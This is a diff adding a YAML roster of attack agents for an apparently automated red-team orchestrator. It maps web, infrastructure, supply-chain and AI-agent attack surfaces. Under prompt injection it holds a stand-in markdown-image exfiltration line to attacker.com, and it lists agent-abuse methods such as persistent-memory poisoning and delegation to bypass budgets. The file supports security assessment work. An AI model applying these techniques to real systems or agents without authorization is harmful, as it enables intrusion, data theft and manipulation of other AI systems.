@@ -1,0 +1,203 @@
+# Machine-readable specialist roster. Consumed by redforge_attack.orchestrator
+# for agent selection based on recon output and user --agents filters.
+#
+# Categories:
+#   meta        — always run (recon first, synthesizer last)
+#   web         — web application attack surfaces
+#   ai_agentic  — AI / agentic workflow attack surfaces
+#   infra       — infrastructure / supply chain attack surfaces
+#   auxiliary   — optional post-run diff / comparison agents
+
+version: 1
+
+selection_rules:
+  # recon always runs first; its output drives specialist selection.
+  always_first: [recon]
+  # synthesizer always runs last after all specialists complete.
+  always_last: [synthesizer]
+  # If the user passes --agents <list>, run only those (plus recon + synthesizer).
+  # Otherwise, recon.notes.md drives dynamic selection per detected surfaces.
+
+meta:
+  - id: recon
+    role: "Map target attack surfaces; runs first, does not exploit."
+    surface: "recon"
+    prompt: "recon.md"
+
+  - id: synthesizer
+    role: "Aggregate per-agent findings into report.md; identify chains and duplicate clusters; write meta-analysis notes."
+    surface: "synthesizer"
+    prompt: "synthesizer.md"
+
+web:
+  - id: auth-session
+    role: "Authn, session management, OAuth/OIDC, JWT, MFA, password reset, cookie flags, CSRF."
+    surface: "auth"
+    covers:
+      - authentication flows
+      - session lifecycle
+      - OAuth state/nonce handling
+      - JWT forgery (alg=none, kid-confusion, weak-secret)
+      - MFA / remember-me / password-reset replay
+      - env-gated fail-open guards (NEXTJS-004 / MCP-001 class)
+
+  - id: authz-idor
+    role: "Broken access control — IDOR, privilege escalation, mass assignment, tenant isolation."
+    surface: "idor"
+    covers:
+      - horizontal / vertical privilege escalation
+      - mass-assignment via hidden request fields
+      - caller-hint headers honored as authoritative (X-Tenant-*, X-Org-*)
+      - tenant isolation probes at every layer
+
+  - id: injection
+    role: "Code / query injection — SQL, NoSQL, LDAP, XPath, OS command, template, XXE, deserialization."
+    surface: "injection"
+    covers:
+      - SQL / NoSQL / LDAP / XPath / OS command injection
+      - SSTI ({{...}}, ${...})
+      - pickle / YAML / Java deserialization
+      - XXE
+
+  - id: ssrf-network
+    role: "SSRF + internal-network pivots + cloud-metadata abuse."
+    surface: "ssrf"
+    covers:
+      - user-supplied URL handling
+      - cloud metadata (169.254.169.254)
+      - DNS rebinding
+      - URL parser confusion (userinfo@host)
+      - webhook / image-proxy / PDF-renderer sinks
+    notes: "If no current fetch sink is attacker-controlled, mark exploitable_now=false (latent)."
+
+  - id: xss-client
+    role: "Client-side injection — reflected / stored / DOM XSS, CSRF, clickjacking, prototype pollution, postMessage, CSP bypass."
+    surface: "xss"
+    covers:
+      - dangerouslySetInnerHTML with interpolated values
+      - UGC rendering paths
+      - markdown-to-HTML without sanitization
+      - DOM sinks (innerHTML, eval, document.write, setTimeout string-form)
+
+  - id: file-handling
+    role: "Upload / extract / parse — path traversal, zip-slip, polyglots, parser CVEs."
+    surface: "file-handling"
+    covers:
+      - upload validation
+      - archive-escape (zip-slip, tar, null-byte)
+      - symlink races
+      - ImageMagick / ffmpeg / PDF parsers
+
+  - id: business-logic
+    role: "Semantic bugs — races (TOCTOU), workflow bypass, pricing / coupon / quota manipulation, rate-limit theater, replay."
+    surface: "business-logic"
+    covers:
+      - concurrent-request races on ownership checks
+      - step-skip in multi-stage flows
+      - negative numbers / integer overflow in price fields
+      - coupon stacking / idempotency gaps
+      - cosmetic rate-limit headers not wired to enforcement
+
+  - id: api-surface
+    role: "REST / GraphQL abuse — mass assignment, batching, debug endpoints, over-fetching, introspection."
+    surface: "api"
+    covers:
+      - version enumeration (/v1/, /v2/, /internal/, /debug/)
+      - HTTP method tampering
+      - content-type confusion
+      - GraphQL alias flooding / depth DoS / prod introspection
+      - OpenAPI spec vs actually-exposed routes
+
+ai_agentic:
+  - id: prompt-injection
+    role: "Direct + indirect prompt injection, jailbreaks, instruction-hierarchy abuse."
+    surface: "prompt-injection"
+    covers:
+      - direct user-input injection
+      - indirect via tool output, RAG, scraped pages, file contents, email bodies
+      - markdown-image-URL exfil (![x](attacker.com/?leak=...))
+      - poisoned documents seeded with instructions
+
+  - id: mcp-tool-abuse
+    role: "MCP gateway + tool surface — over-scoped perms, tool-name confusion, rug-pull, gateway auth."
+    surface: "mcp-tool-abuse"
+    covers:
+      - pretext-task tool invocation
+      - args that exfil via URL parameters
+      - shadow a legitimate tool name
+      - gateway fail-open (if not api_keys) — MCP-001 class
+
+  - id: agent-autonomy
+    role: "Unauthorized action + goal drift — budget exhaustion, persistence, confused-deputy."
+    surface: "agent-autonomy"
+    covers:
+      - nested task delegation to bypass budgets
+      - prompt-injected self-modification
+      - persistent-memory poisoning
+      - cross-session message planting
+      - agents with broad tool authority / scheduled agents
+
+  - id: llm-output-trust
+    role: "Downstream confused-deputy — XSS / SSRF / command / SQL / template injection via model-generated strings."
+    surface: "injection"
+    covers:
+      - LLM output feeding HTML templates / command builders / SQL builders / file paths
+      - plaintext→<br>-shim→HTML pattern (dual-channel)
+      - URL-parameter injection through LLM output
+    chains_with: [prompt-injection, xss-client, injection, ssrf-network]
+
+infra:
+  - id: secrets-hunt
+    role: "Leaked + exposed credentials — hardcoded secrets, env leakage, client-side references, sourcemaps."
+    surface: "secrets"
+    covers:
+      - high-entropy string grep
+      - known-issuer regex (AWS, Stripe, GitHub, JWT)
+      - NEXT_PUBLIC_* vs vendor-safe list
+      - sourcemaps / bundled JS
+      - env-presence-as-auth (F-0001 family)
+
+  - id: ci-cd
+    role: "Pipeline weaponization — workflow perms, runner abuse, artifact tampering, PR-gated secrets."
+    surface: "ci-cd"
+    covers:
+      - pull_request_target with secrets
+      - unpinned actions
+      - self-hosted runner arbitrary-code
+      - tag-rewrite for signed artifacts
+      - Cloud Run --allow-unauthenticated on internal services
+      - negative-space rules (missing serviceAccount, missing .dockerignore, missing permissions)
+
+  - id: container-infra
+    role: "Docker / K8s / IAM — Dockerfile issues, capabilities, RBAC, over-permissive roles, SSRF→metadata→IAM."
+    surface: "container"
+    covers:
+      - root-user / ADD-from-URL / build-arg secrets / COPY . . with missing .dockerignore
+      - runtime capabilities (NET_ADMIN, SYS_PTRACE, privileged)
+      - hostPath / hostNetwork
+      - cross-account AssumeRole chains
+      - IAM policy wildcard hunting
+      - default Compute Engine SA amplifier
+
+  - id: dependency-supply
+    role: "Package-level supply chain — typosquatting, transitive confusion, lock-file integrity, install-scripts."
+    surface: "dependency"
+    covers:
+      - dep-tree vs popular-package diff
+      - homoglyph / typo detection
+      - postinstall script inspection
+      - dependency-confusion for scoped names
+      - lock / manifest drift
+
+auxiliary:
+  - id: baseline-compare
+    role: "Diff this trial's findings against a user-supplied prior red-team report in intake/."
+    surface: "meta"
+    covers:
+      - matched findings (by surface + file:line)
+      - unique-to-mine
+      - unique-to-theirs (learning signal)
+      - severity disagreements calibrated against §1
+      - methodology gaps
+    inputs_required: ["intake/prior-*"]
+    runs_after: [synthesizer]
